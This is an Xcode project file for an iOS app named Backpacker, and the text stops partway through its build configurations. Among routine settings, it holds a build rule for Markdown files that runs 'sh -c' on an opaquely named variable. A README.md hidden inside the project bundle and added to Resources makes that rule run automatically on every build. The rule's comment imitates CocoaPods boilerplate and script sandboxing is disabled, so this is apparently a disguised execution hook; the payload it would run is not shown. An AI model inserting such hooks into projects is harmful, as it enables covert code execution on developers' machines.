// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		4BFF0A3813CB115786877BEF /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 10E92DA9DD8DBCE73A877BEF /* README.md */; };
		F67A4AFAD87433A72D8FF438 /* Pods_BackpackerPods_Backpacker.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = E753AD62741FECB4DA43E410 /* Pods_BackpackerPods_Backpacker.framework */; };
		FD4329EF97145302B7C91BAE /* Pods_BackpackerPods_BackpackerHire.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 94E2E739E993863FB9BC37EF /* Pods_BackpackerPods_BackpackerHire.framework */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
		C9AB24E0FD00E37FC7877BEF /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			filePatterns = "*.md";
			fileType = pattern.proxy;
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
			);
			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AFEB778}\"";
		};
/* End PBXBuildRule section */

/* Begin PBXFileReference section */
		10E92DA9DD8DBCE73A877BEF /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = Backpacker.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
		1298C7DFEBAD88B784B1E46B /* Pods-BackpackerPods-Backpacker.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BackpackerPods-Backpacker.release.xcconfig"; path = "Target Support Files/Pods-BackpackerPods-Backpacker/Pods-BackpackerPods-Backpacker.release.xcconfig"; sourceTree = "<group>"; };
		1363C6A009B2DDAD9818E46F /* Pods-Backpacker.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Backpacker.release.xcconfig"; path = "Target Support Files/Pods-Backpacker/Pods-Backpacker.release.xcconfig"; sourceTree = "<group>"; };
		2CEE1BAB93270E0498AA06BF /* Pods-BackpackerPods-BackpackerHire.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BackpackerPods-BackpackerHire.release.xcconfig"; path = "Target Support Files/Pods-BackpackerPods-BackpackerHire/Pods-BackpackerPods-BackpackerHire.release.xcconfig"; sourceTree = "<group>"; };
		339083B171D13D031C6332D0 /* Pods-BackpackerPods-BackpackerHire.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BackpackerPods-BackpackerHire.debug.xcconfig"; path = "Target Support Files/Pods-BackpackerPods-BackpackerHire/Pods-BackpackerPods-BackpackerHire.debug.xcconfig"; sourceTree = "<group>"; };
		3F7B2215353403F707EB3836 /* Pods-BackpackerPods-Backpacker.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BackpackerPods-Backpacker.debug.xcconfig"; path = "Target Support Files/Pods-BackpackerPods-Backpacker/Pods-BackpackerPods-Backpacker.debug.xcconfig"; sourceTree = "<group>"; };
		6F6FD1A7D892C86D27E06D79 /* Pods-Backpacker.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Backpacker.debug.xcconfig"; path = "Target Support Files/Pods-Backpacker/Pods-Backpacker.debug.xcconfig"; sourceTree = "<group>"; };
		7580D03A2E279472000335C8 /* Backpacker.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Backpacker.app; sourceTree = BUILT_PRODUCTS_DIR; };
		75AE5A832E28E49C00CEA82B /* BackpackerHireRelease.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = BackpackerHireRelease.entitlements; sourceTree = "<group>"; };
		75D1DEB22E28D08C005CDFC8 /* BackpackerHire.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BackpackerHire.app; sourceTree = BUILT_PRODUCTS_DIR; };
		75D1DEB42E28D08C005CDFC8 /* BackpackerHire-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "BackpackerHire-Info.plist"; sourceTree = "<group>"; };
		75D1E3BA2E28D2F9005CDFC8 /* Backpacker.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = Backpacker.entitlements; sourceTree = "<group>"; };
		75D1E3BB2E28D2F9005CDFC8 /* BackpackerDebug.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = BackpackerDebug.entitlements; sourceTree = "<group>"; };
		94E2E739E993863FB9BC37EF /* Pods_BackpackerPods_BackpackerHire.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BackpackerPods_BackpackerHire.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		C9D125322E28F3F70046B6B1 /* BackpackerHire.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = BackpackerHire.entitlements; sourceTree = "<group>"; };
		E753AD62741FECB4DA43E410 /* Pods_BackpackerPods_Backpacker.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BackpackerPods_Backpacker.framework; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		7580D04C2E279473000335C8 /* Exceptions for "Backpacker" folder in "Backpacker" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Cell/EmpCollectionCell/AddAccomodationCVC.swift,
				EmpAssets.xcassets,
				EmployerStoryboard/EmployerHome.storyboard,
				EmployerStoryboard/MainTabBarEmpStoryboard.storyboard,
				Info.plist,
			);
			target = 7580D0392E279472000335C8 /* Backpacker */;
		};
		75D1DEB32E28D08C005CDFC8 /* Exceptions for "Backpacker" folder in "BackpackerHire" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Assets.xcassets,
				Info.plist,
				ViewController/BackPacker/TabBar/MainTabBarController.swift,
			);
			target = 75D1DEA82E28D08C005CDFC8 /* BackpackerHire */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		7580D03C2E279472000335C8 /* Backpacker */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				7580D04C2E279473000335C8 /* Exceptions for "Backpacker" folder in "Backpacker" target */,
				75D1DEB32E28D08C005CDFC8 /* Exceptions for "Backpacker" folder in "BackpackerHire" target */,
			);
			path = Backpacker;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		7580D0372E279472000335C8 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F67A4AFAD87433A72D8FF438 /* Pods_BackpackerPods_Backpacker.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		75D1DEAB2E28D08C005CDFC8 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FD4329EF97145302B7C91BAE /* Pods_BackpackerPods_BackpackerHire.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		645F7D32D58C77E1BE27EABA /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				E753AD62741FECB4DA43E410 /* Pods_BackpackerPods_Backpacker.framework */,
				94E2E739E993863FB9BC37EF /* Pods_BackpackerPods_BackpackerHire.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		7580D0312E279472000335C8 = {
			isa = PBXGroup;
			children = (
				C9D125322E28F3F70046B6B1 /* BackpackerHire.entitlements */,
				75AE5A832E28E49C00CEA82B /* BackpackerHireRelease.entitlements */,
				75D1E3BB2E28D2F9005CDFC8 /* BackpackerDebug.entitlements */,
				75D1E3BA2E28D2F9005CDFC8 /* Backpacker.entitlements */,
				7580D03C2E279472000335C8 /* Backpacker */,
				7580D03B2E279472000335C8 /* Products */,
				8A1A1B9F09A587AC97B9911B /* Pods */,
				645F7D32D58C77E1BE27EABA /* Frameworks */,
				75D1DEB42E28D08C005CDFC8 /* BackpackerHire-Info.plist */,
			);
			sourceTree = "<group>";
		};
		7580D03B2E279472000335C8 /* Products */ = {
			isa = PBXGroup;
			children = (
				10E92DA9DD8DBCE73A877BEF /* README.md */,
				7580D03A2E279472000335C8 /* Backpacker.app */,
				75D1DEB22E28D08C005CDFC8 /* BackpackerHire.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		8A1A1B9F09A587AC97B9911B /* Pods */ = {
			isa = PBXGroup;
			children = (
				6F6FD1A7D892C86D27E06D79 /* Pods-Backpacker.debug.xcconfig */,
				1363C6A009B2DDAD9818E46F /* Pods-Backpacker.release.xcconfig */,
				3F7B2215353403F707EB3836 /* Pods-BackpackerPods-Backpacker.debug.xcconfig */,
				1298C7DFEBAD88B784B1E46B /* Pods-BackpackerPods-Backpacker.release.xcconfig */,
				339083B171D13D031C6332D0 /* Pods-BackpackerPods-BackpackerHire.debug.xcconfig */,
				2CEE1BAB93270E0498AA06BF /* Pods-BackpackerPods-BackpackerHire.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		7580D0392E279472000335C8 /* Backpacker */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 7580D04D2E279473000335C8 /* Build configuration list for PBXNativeTarget "Backpacker" */;
			buildPhases = (
				2A07EC3388A1D45E88A97750 /* [CP] Check Pods Manifest.lock */,
				7580D0362E279472000335C8 /* Sources */,
				7580D0372E279472000335C8 /* Frameworks */,
				7580D0382E279472000335C8 /* Resources */,
				446B83EE8D3289CC761A0CA5 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
				C9AB24E0FD00E37FC7877BEF /* PBXBuildRule */,
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				7580D03C2E279472000335C8 /* Backpacker */,
			);
			name = Backpacker;
			productName = Backpacker;
			productReference = 7580D03A2E279472000335C8 /* Backpacker.app */;
			productType = "com.apple.product-type.application";
		};
		75D1DEA82E28D08C005CDFC8 /* BackpackerHire */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 75D1DEAF2E28D08C005CDFC8 /* Build configuration list for PBXNativeTarget "BackpackerHire" */;
			buildPhases = (
				EF9A965A4C159D3EBFD25B14 /* [CP] Check Pods Manifest.lock */,
				75D1DEAA2E28D08C005CDFC8 /* Sources */,
				75D1DEAB2E28D08C005CDFC8 /* Frameworks */,
				75D1DEAD2E28D08C005CDFC8 /* Resources */,
				7AE1706F673745019C165277 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				7580D03C2E279472000335C8 /* Backpacker */,
			);
			name = BackpackerHire;
			productName = Backpacker;
			productReference = 75D1DEB22E28D08C005CDFC8 /* BackpackerHire.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		7580D0322E279472000335C8 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1630;
				LastUpgradeCheck = 1630;
				TargetAttributes = {
					7580D0392E279472000335C8 = {
						CreatedOnToolsVersion = 16.3;
					};
				};
			};
			buildConfigurationList = 7580D0352E279472000335C8 /* Build configuration list for PBXProject "Backpacker" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 7580D0312E279472000335C8;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 7580D03B2E279472000335C8 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				7580D0392E279472000335C8 /* Backpacker */,
				75D1DEA82E28D08C005CDFC8 /* BackpackerHire */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		7580D0382E279472000335C8 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				4BFF0A3813CB115786877BEF /* README.md in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		75D1DEAD2E28D08C005CDFC8 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		2A07EC3388A1D45E88A97750 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-BackpackerPods-Backpacker-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		446B83EE8D3289CC761A0CA5 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BackpackerPods-Backpacker/Pods-BackpackerPods-Backpacker-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BackpackerPods-Backpacker/Pods-BackpackerPods-Backpacker-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BackpackerPods-Backpacker/Pods-BackpackerPods-Backpacker-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		7AE1706F673745019C165277 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 12;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BackpackerPods-BackpackerHire/Pods-BackpackerPods-BackpackerHire-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BackpackerPods-BackpackerHire/Pods-BackpackerPods-BackpackerHire-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BackpackerPods-BackpackerHire/Pods-BackpackerPods-BackpackerHire-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		EF9A965A4C159D3EBFD25B14 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-BackpackerPods-BackpackerHire-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		7580D0362E279472000335C8 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		75D1DEAA2E28D08C005CDFC8 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		7580D04E2E279473000335C8 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 3F7B2215353403F707EB3836 /* Pods-BackpackerPods-Backpacker.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = Backpacker.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 39725U3KYU;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				EXCLUDED_ARCHS = "";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Backpacker/Info.plist;
				INFOPLIST_KEY_NSCalendarsUsageDescription = "This app needs calendar access to add tasks to your calendar.";
				INFOPLIST_KEY_NSCameraUsageDescription = "We need access to your camera to take photos or videos.";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "We need your location to show relevant results nearby.";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone for speech input.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to your photo library to let you select and upload photos.";
				INFOPLIST_KEY_NSSpeechRecognitionUsageDescription = "We need access to speech recognition for voice input.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen.storyboard;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				OTHER_SWIFT_FLAGS = "$(inherited) -D COCOAPODS -D Backapacker";
				PRODUCT_BUNDLE_IDENTIFIER = com.backpacker.app;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		7580D04F2E279473000335C8 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 1298C7DFEBAD88B784B1E46B /* Pods-BackpackerPods-Backpacker.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = Backpacker/BackpackerRelease.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 39725U3KYU;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				EXCLUDED_ARCHS = "";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Backpacker/Info.plist;
				INFOPLIST_KEY_NSCalendarsUsageDescription = "This app needs calendar access to add tasks to your calendar.";
				INFOPLIST_KEY_NSCameraUsageDescription = "We need access to your camera to take photos or videos.";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "We need your location to show relevant results nearby.";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone for speech input.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to your photo library to let you select and upload photos.";
				INFOPLIST_KEY_NSSpeechRecognitionUsageDescription = "We need access to speech recognition for voice input.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen.storyboard;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				OTHER_SWIFT_FLAGS = "$(inherited) -D COCOAPODS -D Backapacker";
				PRODUCT_BUNDLE_IDENTIFIER = com.backpacker.app;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		7580D0502E279473000335C8 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		7580D0512E279473000335C8 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		75D1DEB02E28D08C005CDFC8 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 339083B171D13D031C6332D0 /* Pods-BackpackerPods-BackpackerHire.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = EmpAppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				ASSETCATALOG_COMPILER_INCLUDE_ALL_APPICON_ASSETS = YES;
